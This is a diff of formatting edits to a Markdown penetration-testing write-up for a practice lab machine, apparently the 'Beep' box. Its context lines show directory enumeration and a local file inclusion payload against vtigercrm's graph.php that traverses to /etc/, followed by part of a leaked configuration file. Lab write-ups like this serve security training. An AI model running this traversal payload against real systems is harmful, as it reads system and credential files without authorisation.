@@ -1,6 +1,6 @@
 Target: 10.10.10.7
 
-## Enumeration
+## Enumeration:
 
 nmap
 ```
@@ -63,6 +63,7 @@ configs                 [Status: 301, Size: 311, Words: 20, Lines: 10]
 ```
 
 checking 10.10.10.7
+
 ![index](beep1.png)
 
 ### Findings:Looking for attack vectors
@@ -81,10 +82,12 @@ LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/
 ```
 
 testing lfi vulnerablity
+
 ![lfi](beep2.png)
 
 viewing source to read better
-![view source lfi](beep3.png)
+
+![src:lfi](beep3.png)
 
 ```
 AMPDBHOST=localhost
